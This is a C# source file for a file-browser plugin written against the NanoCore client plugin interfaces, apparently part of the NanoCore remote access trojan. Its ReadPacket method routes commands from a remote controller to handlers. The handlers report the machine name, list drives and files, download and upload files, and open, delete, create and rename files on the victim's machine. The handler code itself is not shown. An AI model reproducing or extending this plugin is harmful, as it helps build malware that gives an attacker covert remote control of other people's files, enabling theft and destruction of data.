using NanoCore.ClientPlugin;
using NanoCore.ClientPluginHost;

namespace FileBrowserClient
{
    public class ClientPlugin : IClientNetwork
	{
		public ClientPlugin(IClientLoggingHost _loggingHost, IClientNetworkHost _networkHost)
		{
			ClientMain.LoggingHost = _loggingHost;
			ClientMain.NetworkHost = _networkHost;
			ClientMain.InitializePlugin();
		}

		public void BuildingHostCache()
		{
		}

		public void ConnectionFailed(string host, ushort port)
		{
		}

		public void ConnectionStateChanged(bool connected)
		{
		}

		public void PipeClosed(string pipeName)
		{
		}

		public void PipeCreated(string pipeName)
		{
		}

		public void ReadPacket(string pipeName, object[] @params)
		{
			switch ((CommandTypes)@params[0])
			{
				case CommandTypes.MachineName:
					CommandHandlers.HandleMachineName(@params);
					break;
				case CommandTypes.Drives:
					CommandHandlers.HandleDrives(@params);
					break;
				case CommandTypes.Files:
					CommandHandlers.HandleFiles(@params);
					break;
				case CommandTypes.GetCurrentDirectory:
					CommandHandlers.HandleGetCurrentDirectory(@params);
					break;
				case CommandTypes.SetCurrentDirectory:
					CommandHandlers.HandleSetCurrentDirectoryPacket(@params);
					break;
				case CommandTypes.Download:
					CommandHandlers.HandleDownload(@params);
					break;
				case CommandTypes.Upload:
					CommandHandlers.HandleUpload(@params);
					break;
				case CommandTypes.Open:
					CommandHandlers.HandleOpen(@params);
					break;
				case CommandTypes.Delete:
					CommandHandlers.HandleDelete(@params);
					break;
				case CommandTypes.CreateDirectory:
					CommandHandlers.HandleCreate(@params);
					break;
				case CommandTypes.Rename:
					CommandHandlers.HandleRename(@params);
					break;
			}
		}
	}
}